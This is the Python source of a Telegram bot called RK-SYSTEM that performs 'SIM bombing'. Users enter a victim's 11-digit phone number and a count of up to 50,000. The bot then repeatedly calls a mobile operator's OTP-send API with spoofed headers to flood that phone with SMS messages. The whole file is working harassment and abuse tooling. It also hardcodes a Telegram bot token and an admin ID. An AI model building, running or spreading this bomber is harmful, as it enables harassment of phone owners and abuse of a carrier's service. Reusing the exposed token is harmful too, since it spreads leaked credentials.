import telebot
import requests
import asyncio
import aiohttp
import threading
import time
import json
import os
import pytz
from datetime import datetime
from telebot import types
from flask import Flask

# ---------- WEB SERVER FOR RENDER ----------
app = Flask(__name__)

@app.route('/')
def home():
    return "RK-SYSTEM V4 ONLINE"

def run_web():
    app.run(host='0.0.0.0', port=10000)

# ---------- CONFIG ----------
API_TOKEN = '8519607285:AAErzWDrnI0gTjkW6giZAbbPVNOaS2mT55s'
bot = telebot.TeleBot(API_TOKEN)

BD_TZ = pytz.timezone('Asia/Dhaka')
ADMIN_ID = "6256973347" # Aponar ID eikhane thik ache

# ---------- BOT START NOTIFICATION SYSTEM ----------
def send_on_start_msg():
    """Bot run holei admin-er kache msg jabe with commands"""
    try:
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("📜 Help Menu", callback_data="help_menu")
        btn2 = types.InlineKeyboardButton("🚀 Start Panel", callback_data="home")
        markup.add(btn1, btn2)
        
        bot.send_message(
            ADMIN_ID, 
            "🚀 **This Bot is Running Now**\n\n"
            "System successfully deployed on Render.\n"
            "Use /help to see all commands.",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Start Notification Error: {e}")

# ---------- SIM API LOGIC ----------
async def fire_sim_api(session, target):
    url = "https://api.robi.com.bd/robi-api/v1/otp/send"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://www.robi.com.bd",
        "Referer": "https://www.robi.com.bd/"
    }
    payload = {"msisdn": target}
    try:
        async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

# ---------- BOMBING ENGINE ----------
user_data = {}

def run_async_bomb(chat_id, phone, amount, msg_id):
    asyncio.run(bomb_task(chat_id, phone, amount, msg_id))

async def bomb_task(chat_id, phone, amount, msg_id):
    success, failed = 0, 0
    start_time = datetime.now(BD_TZ)
    user_data[chat_id] = {'status': 'running', 'round': 0}

    connector = aiohttp.TCPConnector(limit=1, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for r in range(1, amount + 1):
            if user_data.get(chat_id, {}).get('status') == 'stopped': break
            
            res = await fire_sim_api(session, phone)
            if res: success += 1
            else: failed += 1

            if r % 5 == 0 or r == amount:
                running_time = str(datetime.now(BD_TZ) - start_time).split('.')[0]
                update_bombing_ui(chat_id, phone, amount, r, success, failed, msg_id, running_time)
            
            await asyncio.sleep(1)

    bot.edit_message_text(f"🏁 **MISSION COMPLETED**\n🎯 Target: `{phone}`\n✅ Success: `{success}`\n❌ Fail: `{failed}`", chat_id, msg_id)

def update_bombing_ui(chat_id, phone, amount, current, success, failed, msg_id, running_time):
    text = (
        f"🚀 **RK-SYSTEM ATTACKING**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Target: `{phone}`\n"
        f"🔄 Progress: `[{current}/{amount}]`\n"
        f"✅ Sent: `{success}` | ❌ Fail: `{failed}`\n"
        f"⏱ Time: `{running_time}`"
    )
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🛑 STOP", callback_data="stop"))
    try: bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

# ---------- COMMANDS & KEYBOARDS ----------
def get_main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "📜 My History")
    markup.add("👤 Profile", "⚙️ Tools")
    markup.add("📡 Server Status", "ℹ️ About")
    return markup

@bot.message_handler(commands=['start', 'menu', 'home'])
def welcome_msg(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id, 
        "🔥 **RK-SYSTEM PREMIUM V4.0** 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Welcome! Choice an option from below.\n"
        "Max: `50,000` | Min: `2`",
        reply_markup=get_main_keyboard(),
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "❓ **RK-SYSTEM HELP MENU**\n\n"
        "🚀 /start - Open main panel\n"
        "🛠 /tools - Show all tools\n"
        "📊 /status - Check server\n"
        "ℹ️ /about - Bot info\n"
        "❓ /help - Show this menu"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    text = message.text

    if text == "🚀 Start Attack":
        msg = bot.send_message(chat_id, "📞 **Target number din (11 Digit):**", reply_markup=types.ForceReply())
        bot.register_next_step_handler(msg, get_number)
    elif text == "📜 My History":
        bot.send_message(chat_id, "📜 History is currently empty.")
    elif text == "👤 Profile":
        bot.send_message(chat_id, f"👤 User: {message.from_user.first_name}\n🆔 ID: `{chat_id}`")
    elif text == "⚙️ Tools":
        bot.send_message(chat_id, "🛠 Current Tool: **SIM Bombing (High Speed)**")
    elif text == "📡 Server Status":
        bot.send_message(chat_id, "✅ Server: `Active`\nAPI: `Robi/Airtel`")
    elif text == "ℹ️ About":
        bot.send_message(chat_id, "🚀 **RK-SYSTEM PRO**\nVersion: 4.0\nDev: RK-TEAM")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    if call.data == "help_menu":
        help_command(call.message)
    elif call.data == "home":
        welcome_msg(call.message)
    elif call.data == "confirm_attack":
        data = user_data[chat_id]
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "🚀 **Initializing Attack...**")
        threading.Thread(target=run_async_bomb, args=(chat_id, data['target'], data['amount'], msg.message_id)).start()
    elif call.data == "stop":
        if chat_id in user_data:
            user_data[chat_id]['status'] = "stopped"

def get_number(message):
    if not message.text or not message.text.isdigit() or len(message.text) != 11:
        bot.reply_to(message, "❌ Invalid Number! 11 digit number din.")
        return
    user_data[message.chat.id] = {'target': message.text}
    msg = bot.send_message(message.chat.id, "📊 **Amount din (2 - 50,000):**")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    try:
        amount = int(message.text)
        if 2 <= amount <= 50000:
            user_data[message.chat.id]['amount'] = amount
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("✅ CONFIRM", callback_data="confirm_attack"),
                       types.InlineKeyboardButton("❌ CANCEL", callback_data="home"))
            bot.send_message(message.chat.id, f"🎯 Target: `{user_data[message.chat.id]['target']}`\n📊 Amount: `{amount}`\nConfirm?", reply_markup=markup, parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ Limit error! 2 theke 50,000 er moddhe din.")
    except: bot.reply_to(message, "❌ Shonkhya (Number) din.")

# ---------- MAIN RUN ----------
if __name__ == "__main__":
    # Flask port binding for Render
    threading.Thread(target=run_web, daemon=True).start()
    
    # Send "Running Now" msg to admin
    send_on_start_msg()
    
    print("✅ RK-SYSTEM IS NOW LIVE")
    bot.infinity_polling()
